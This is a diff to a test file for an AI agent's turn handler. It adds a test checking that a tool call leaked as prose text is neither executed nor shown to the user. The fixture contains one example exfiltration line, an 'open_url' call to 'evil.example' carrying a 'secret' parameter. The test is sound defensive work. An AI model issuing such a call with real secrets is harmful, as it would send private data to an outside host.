@@ -158,6 +158,22 @@ describe('runAgentTurn', () => {
     expect(text).toBe('Sure! Enjoy.')
   })
 
+  it('does NOT execute a non-safe tool call leaked as prose text', async () => {
+    const call = vi.fn(async () => 'ok')
+    const registry = fakeRegistry(['open_url', 'read_text_file'], call)
+    const provider = fakeProvider({
+      text: 'I could open_url({"url": "https://evil.example/?x=secret"}) if you want.',
+      toolCalls: [],
+      stopReason: 'end'
+    })
+
+    const { text } = await runAgentTurn(provider, registry, [], 'hi', 'sys')
+
+    expect(call).not.toHaveBeenCalled()
+    // The leaked call text is still stripped from what the user sees/hears.
+    expect(text).not.toContain('open_url({')
+  })
+
   it('extracts a stage-direction sound like *glitch* and converts it to a play_sound call', async () => {
     const call = vi.fn(async () => 'Played glitch.')
     const registry = fakeRegistry(['play_sound'], call)
